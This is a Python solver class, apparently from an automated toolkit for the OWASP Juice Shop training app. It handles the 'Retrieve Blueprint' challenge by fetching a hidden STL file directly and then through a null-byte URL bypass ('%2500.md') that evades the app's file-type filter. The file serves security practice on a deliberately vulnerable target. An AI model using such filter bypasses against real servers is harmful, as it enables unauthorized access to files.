from core.base_solver import BaseSolver
from loguru import logger

class RetrieveBlueprintSolver(BaseSolver):
    """
    Challenge: Retrieve Blueprint (retrieveBlueprintChallenge)
    
    File blueprint: JuiceShop.stl
    Đường dẫn: /assets/public/images/products/JuiceShop.stl
    """
    @property
    def challenge_key(self) -> str:
        return "retrieveBlueprintChallenge"

    def solve(self) -> bool:
        # Try direct access
        url = "/assets/public/images/products/JuiceShop.stl"
        response = self.client.get(url)
        
        if response.ok:
            logger.info(f"Blueprint retrieved: {len(response.content)} bytes")
            return True
        
        # Try null byte bypass
        url_bypass = "/ftp/JuiceShop.stl%2500.md"
        response = self.client.get(url_bypass)
        
        if response.ok:
            logger.info("Blueprint retrieved via null byte bypass")
            return True
        
        logger.error("Failed to retrieve blueprint")
        return False
